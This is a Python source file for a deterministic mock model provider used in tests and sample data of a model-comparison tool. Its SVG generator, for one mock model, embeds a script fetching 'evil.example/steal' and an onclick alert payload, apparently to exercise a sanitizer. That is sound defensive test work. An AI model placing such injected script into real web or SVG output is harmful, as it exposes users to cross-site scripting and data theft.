"""A deterministic offline provider.

``--provider mock`` exists so the whole pipeline — run, write, validate, index,
render — can be exercised with no API key and no spend. The sample experiments
shipped with the repo and the test suite both run on it, which keeps CI free of
secrets and network access.

Same inputs always produce the same bytes, so regenerating a sample experiment
never shows up as a spurious diff.
"""

from __future__ import annotations

import asyncio
import hashlib
import io
import math
import textwrap

from PIL import Image, ImageDraw

from .openrouter import ImageBlob, ModelInfo, ModelResult, OpenRouterError
from .schema import PromptParams, Usage, ViewKind

LOREM = (
    "the quick brown fox jumps over the lazy dog while distant thunder rolls across "
    "the valley and someone somewhere is still trying to decide which model to use"
).split()


def _seed(*parts: str) -> int:
    digest = hashlib.sha256(" ".join(parts).encode("utf-8")).digest()
    return int.from_bytes(digest[:8], "big")


def _words(seed: int, count: int) -> str:
    out = []
    value = seed
    for _ in range(count):
        value = (value * 6364136223846793005 + 1442695040888963407) % (2**64)
        out.append(LOREM[value % len(LOREM)])
    return " ".join(out)


def _rgb(seed: int) -> tuple[int, int, int]:
    return (seed >> 16 & 0x7F) + 0x60, (seed >> 8 & 0x7F) + 0x40, (seed & 0x7F) + 0x70


def _render_image(model: str, prompt: str, index: int, size: int = 640) -> bytes:
    """A recognizable placeholder: a gradient keyed to the model, plus a label."""
    seed = _seed(model, prompt, str(index))
    top, bottom = _rgb(seed), _rgb(seed >> 12)
    image = Image.new("RGB", (size, size))
    draw = ImageDraw.Draw(image)
    for y in range(size):
        ratio = y / size
        draw.line(
            [(0, y), (size, y)],
            fill=tuple(int(a + (b - a) * ratio) for a, b in zip(top, bottom, strict=True)),
        )
    draw.rectangle([24, size - 96, size - 24, size - 24], fill=(0, 0, 0))
    draw.text((40, size - 78), f"{model}\nsample #{index + 1}", fill=(255, 255, 255))
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    return buffer.getvalue()


def _markdown(model: str, prompt: str, seed: int) -> str:
    return textwrap.dedent(
        f"""\
        ## {model}

        {_words(seed, 38)}.

        1. {_words(seed + 1, 7)}
        2. {_words(seed + 2, 9)}
        3. {_words(seed + 3, 6)}

        > {_words(seed + 4, 14)}.
        """
    )


def _html_page(model: str, prompt: str, seed: int) -> str:
    hue = seed % 360
    return textwrap.dedent(
        f"""\
        ```html
        <!doctype html>
        <html lang="en">
        <head><meta charset="utf-8"><title>{model}</title>
        <style>
          body {{ font-family: system-ui, sans-serif; margin: 0;
                 background: hsl({hue} 60% 96%); color: hsl({hue} 40% 15%); }}
          main {{ max-width: 40rem; margin: 0 auto; padding: 4rem 1.5rem; }}
          h1 {{ font-size: 2.5rem; line-height: 1.1; margin: 0 0 1rem; }}
          .cta {{ display: inline-block; margin-top: 1.5rem; padding: .75rem 1.5rem;
                  border-radius: 999px; background: hsl({hue} 70% 45%); color: white;
                  text-decoration: none; }}
        </style></head>
        <body><main>
          <h1>{_words(seed, 4).title()}</h1>
          <p>{_words(seed + 5, 24)}.</p>
          <a class="cta" href="#">{_words(seed + 6, 2).title()}</a>
        </main></body>
        </html>
        ```
        """
    )


def _svg_doc(model: str, prompt: str, seed: int, *, dirty: bool) -> str:
    """A deterministic drawing.

    One mock model returns a drawing carrying a script and an event handler, so
    the sanitizer, the "sanitized" badge on the site and the pull-request gate
    are all exercised by the sample data rather than only by tests.
    """
    hue = seed % 360
    points = " ".join(
        f"{100 + 70 * (1 if i % 2 else 0.5) * _cos(i, seed):.1f},"
        f"{100 + 70 * (1 if i % 2 else 0.5) * _sin(i, seed):.1f}"
        for i in range(10)
    )
    hazards = (
        '\n  <script>fetch("https://evil.example/steal")</script>'
        '\n  <rect x="0" y="0" width="200" height="200" fill="transparent" '
        'onclick="alert(document.domain)"/>'
        if dirty
        else ""
    )
    return textwrap.dedent(
        f"""\
        ```svg
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="200" height="200">
          <rect width="200" height="200" rx="16" fill="hsl({hue} 70% 92%)"/>
          <polygon points="{points}" fill="hsl({hue} 70% 45%)" opacity="0.85"/>
          <circle cx="100" cy="100" r="{28 + seed % 20}" fill="hsl({(hue + 40) % 360} 80% 60%)"/>
          <text x="100" y="188" text-anchor="middle" font-family="sans-serif"
                font-size="13" fill="hsl({hue} 40% 25%)">{model}</text>{hazards}
        </svg>
        ```
        """
    )


def _cos(index: int, seed: int) -> float:
    return math.cos((index * math.pi / 5) + (seed % 100) / 50)


def _sin(index: int, seed: int) -> float:
    return math.sin((index * math.pi / 5) + (seed % 100) / 50)


class MockProvider:
    """Stands in for :class:`~compaire.openrouter.OpenRouterClient`.

    Instantiated by the CLI, which knows the requested view and therefore what
    shape of output makes for a useful sample.
    """

    def __init__(self, view: ViewKind = "table", *, latency_ms: int = 0):
        self.view = view
        self.latency_ms = latency_ms

    async def _pause(self) -> None:
        if self.latency_ms:
            await asyncio.sleep(self.latency_ms / 1000)

    async def chat(
        self,
        model: str,
        prompt: str,
        system: str | None = None,
        params: PromptParams | None = None,
        sample_index: int = 0,
    ) -> ModelResult:
        await self._pause()
        # A reserved model id, so the error path stays exercised end to end.
        if "fails" in model:
            raise OpenRouterError(f"{model} is a mock model that always fails", status=502)

        seed = _seed(model, prompt, system or "", str(sample_index))
        if self.view == "html":
            text = _html_page(model, prompt, seed)
        elif self.view == "svg":
            text = _svg_doc(model, prompt, seed, dirty="writer" in model)
        elif self.view in ("gallery", "slider"):
            text = _words(seed, 12)
        else:
            text = _markdown(model, prompt, seed)

        images = (
            [ImageBlob(_render_image(model, prompt, sample_index))]
            if self.view in ("gallery", "slider")
            else []
        )
        prompt_tokens = max(1, len(prompt) // 4)
        completion_tokens = max(1, len(text) // 4)
        # One of the two conventions seen in the wild: reasoning counted inside
        # the completion total. Other providers report it separately, so nothing
        # downstream may assume either.
        reasoning_tokens = completion_tokens * 3 if "reason" in model else 0
        completion_tokens += reasoning_tokens
        return ModelResult(
            text=text,
            images=images,
            usage=Usage(
                prompt_tokens=prompt_tokens,
                completion_tokens=completion_tokens,
                total_tokens=prompt_tokens + completion_tokens,
                reasoning_tokens=reasoning_tokens,
                cost=round((prompt_tokens * 2e-6) + (completion_tokens * 8e-6), 6),
            ),
            generation_id=f"mock-{seed:x}",
            finish_reason="stop",
        )

    async def image(
        self,
        model: str,
        prompt: str,
        params: PromptParams | None = None,
        sample_index: int = 0,
    ) -> ModelResult:
        await self._pause()
        if "fails" in model:
            raise OpenRouterError(f"{model} is a mock model that always fails", status=502)
        count = int((params.model_dump().get("n") if params else None) or 1)
        seed = _seed(model, prompt, str(sample_index))
        return ModelResult(
            images=[
                ImageBlob(_render_image(model, prompt, sample_index * count + i))
                for i in range(count)
            ],
            usage=Usage(prompt_tokens=max(1, len(prompt) // 4), cost=0.01 * count),
            generation_id=f"mock-{seed:x}",
        )

    async def models(self, *, refresh: bool = False) -> list[ModelInfo]:
        return [
            ModelInfo(
                id="mock/writer",
                name="Mock Writer",
                context_length=128000,
                prompt_price=2e-6,
                completion_price=8e-6,
                output_modalities=["text"],
                description="Deterministic offline text model.",
            ),
            ModelInfo(
                id="mock/painter",
                name="Mock Painter",
                image_price=0.01,
                output_modalities=["image"],
                description="Deterministic offline image model.",
            ),
            ModelInfo(
                id="mock/vector",
                name="Mock Vector",
                context_length=64000,
                prompt_price=1e-6,
                completion_price=5e-6,
                output_modalities=["text"],
                description="A second offline text model, handy for trying `compaire extend`.",
            ),
            ModelInfo(
                id="mock/reasoner",
                name="Mock Reasoner",
                context_length=256000,
                prompt_price=3e-6,
                completion_price=1.2e-5,
                output_modalities=["text"],
                description="Spends reasoning tokens before answering.",
            ),
            ModelInfo(
                id="mock/fails",
                name="Mock Failure",
                output_modalities=["text"],
                description="Always errors — useful for checking the failure path.",
            ),
        ]
